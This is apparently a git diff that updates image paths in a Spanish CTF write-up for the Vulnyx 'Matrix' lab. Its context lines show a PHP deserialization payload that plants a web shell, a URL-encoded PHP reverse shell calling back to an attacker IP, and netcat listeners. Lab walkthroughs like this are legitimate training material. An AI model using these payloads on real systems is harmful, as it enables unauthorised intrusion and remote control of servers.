@@ -5,7 +5,7 @@ title: WriteUp Matrix - Vulnyx
 slug: matrix-writeup-vulnyx-es
 featured: false
 draft: false
-ogImage: "assets/matrix/OpenGraph.png"
+ogImage: "../../../assets/images/matrix/OpenGraph.png"
 tags:
   - writeup
   - vulnyx
@@ -18,7 +18,7 @@ description:
 lang: es
 ---
 
-![Conejo en Matrix](/assets/matrix/OpenGraph.png)
+![Conejo en Matrix](../../../assets/images/matrix/OpenGraph.png)
 
 Este writeup documenta la explotación de una máquina vulnerable inspirada en Matrix, utilizando análisis de tráfico, inyección PHP y escalada de privilegios con rsync para obtener acceso root.
 
@@ -60,11 +60,11 @@ Vemos dos puertos abiertos, 22 para el servicio SSH y el puerto 80 para el servi
 
 Accedemos con el navegador al servicio web.
 
-![alt text](/assets/matrix/image-1.png)
+![alt text](../../../assets/images/matrix/image-1.png)
 
 Dentro del código fuente encontramos un comentario con una pista.
 
-![alt text](/assets/matrix/image-2.png)
+![alt text](../../../assets/images/matrix/image-2.png)
 
 `Follow the red rabbit... Is it a dream or a clue? Within the saved traffic, you may find traces of the Matrix. Could it be a .pcap file ready to fuzz?`
 
@@ -74,7 +74,7 @@ Asi que sin dudarlo hacemos fuzzing del servicio web en búsqueda de un fichero 
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.168 -x .pcap,.php,.txt,.zip,.db
 ```
 
-![alt text](/assets/matrix/image-3.png)
+![alt text](../../../assets/images/matrix/image-3.png)
 
 Encontramos un fichero `trinity.pcap`.
 
@@ -90,9 +90,9 @@ Encontramos muchos usuarios, contraseñas y subdominios de diferentes servicios 
 
 Detectamos que se transfiere una imagen mediante HTTP, intentamos exportarla del trafico mediante Wireshark.
 
-![alt text](/assets/matrix/image-4.png)
+![alt text](../../../assets/images/matrix/image-4.png)
 
-![alt text](/assets/matrix/image-5.png)
+![alt text](../../../assets/images/matrix/image-5.png)
 
 Una vez descargada la renombramos y analizamos los metadatos con la herramienta `exiftool`.
   
@@ -118,7 +118,7 @@ Encontramos un comentario muy interesante en la metadata `Description`, donde se
 Morpheus, we have found a direct connection to the 'Mind', the artificial intelligence that controls the Matrix. You can find it at the domain M47r1X.matrix.nyx.
 ```
 
-![alt text](/assets/matrix/image-7.png)
+![alt text](../../../assets/images/matrix/image-7.png)
 
 Otras formas de llegar a obtener este subdominio y otros datos sensibles del fichero pcap, es analizando el trafico en el mismo Wireshark o con el comando `strings` y `grep`.
 
@@ -139,7 +139,7 @@ M47r1X.matrix.nyx
 
 Más información en el fichero .pcap ...
 
-![alt text](/assets/matrix/image-6.png)
+![alt text](../../../assets/images/matrix/image-6.png)
 
 Subdominios que no nos sirven, el que si que funciona es `M47r1X.matrix.nyx` que contiene un virtualhost, lo añadimos a nuestro hosts files.
 
@@ -147,15 +147,15 @@ Subdominios que no nos sirven, el que si que funciona es `M47r1X.matrix.nyx` que
 
 Accedemos al virtualhost `M47r1X.matrix.nyx` con el navegador para acceder a **La Mente** de Matrix ;)
 
-![alt text](/assets/matrix/image-8.png)
+![alt text](../../../assets/images/matrix/image-8.png)
 
 Si enviamos mensajes el chat siempre contesta con símbolos raros, hay una opción aleatoria que puede responder con una pista:
 
-![alt text](/assets/matrix/image-9.png)
+![alt text](../../../assets/images/matrix/image-9.png)
 
 Obtenemos el fichero con la filtración del backend.
 
-![alt text](/assets/matrix/image-10.png)
+![alt text](../../../assets/images/matrix/image-10.png)
 
 En el código de la página hay un comentario y código en el javascript que nos da más pista de como va la intrusión, ademas del posible mensaje que muestra la filtración del backend.
 
@@ -171,7 +171,7 @@ En el código de la página hay un comentario y código en el javascript que nos
 
 Utilizamos burpsuite para facilitar la intrusión, enviamos el mensaje `test` y comprobamos que envía un objeto serializado en PHP, que seguramente se serializara en el servidor con la clase PHP filtrada.
 
-![alt text](/assets/matrix/image-11.png)
+![alt text](../../../assets/images/matrix/image-11.png)
 
 ```bash
 O:7:"Message":1:{s:7:"message";s:4:"test";}
@@ -205,11 +205,11 @@ Lo ejecutamos y esto es lo que enviaremos.
 O:7:"Message":2:{s:4:"file";s:9:"shell.php";s:7:"message";s:33:"<?php echo exec($_GET["cmd"]); ?>";}
 ```
 
-![alt text](/assets/matrix/image-12.png)
+![alt text](../../../assets/images/matrix/image-12.png)
 
 Ahora ya tenemos un RCE con el fichero que se ha creado `shell.php` con la deserialización del mensaje en PHP.
 
-![alt text](/assets/matrix/image-13.png)
+![alt text](../../../assets/images/matrix/image-13.png)
 
 Creamos revshell en php, la ip 192.168.1.116 es la de nuestra maquina atacante.
 
@@ -227,7 +227,7 @@ nc -lvnp 443
 wget http://m47r1x.matrix.nyx/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.1.116%22%2C443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
 ```
 
-![alt text](/assets/matrix/image-14.png)
+![alt text](../../../assets/images/matrix/image-14.png)
 
 Ya somos el usuario www-data.
 
@@ -290,7 +290,7 @@ Introducimos la contraseña filtrada y ya somos smith.
 
 La forma más complicada, si utilizamos pspy64 o cualquier otra herramienta, miramos los procesos que se ejecutan con el usuario smith.
 
-![alt text](/assets/matrix/image-15.png)
+![alt text](../../../assets/images/matrix/image-15.png)
 
 Podemos observar como hay una tarea programada que se ejecuta cada minuto.
 
@@ -329,7 +329,7 @@ nc -lvnp 12345
 
 y en un minuto obtenemos una shell con el usuario `smith`.
 
-![alt text](/assets/matrix/image-16.png)
+![alt text](../../../assets/images/matrix/image-16.png)
 
 ### smith to root (sudo rsync)
 
@@ -385,7 +385,7 @@ User smith may run the following commands on matrix:
 
 Podemos ejecutar rsync como el usuario root, gracias a gtfobins encontramos esta forma de escalar a root.
 
-![alt text](/assets/matrix/image-17.png)
+![alt text](../../../assets/images/matrix/image-17.png)
 
 Lo ejecutamos y obtenemos shell como root y leemos la flag.
 
